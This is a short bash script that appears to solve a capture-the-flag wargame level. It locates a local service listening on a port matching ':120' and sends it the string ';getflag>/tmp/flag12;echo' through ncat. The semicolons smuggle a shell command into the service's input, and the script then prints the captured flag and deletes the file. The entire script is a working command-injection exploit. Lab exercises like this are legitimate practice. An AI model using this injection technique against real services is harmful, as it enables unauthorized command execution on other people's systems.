#!/usr/bin/env bash

port="$(ss -ant | awk '/LISTEN.+:120/ {print $4}')"
echo ";getflag>/tmp/flag12;echo" | ncat 127.0.0.1 "${port##*:}"

cat /tmp/flag12
rm -f /tmp/flag12
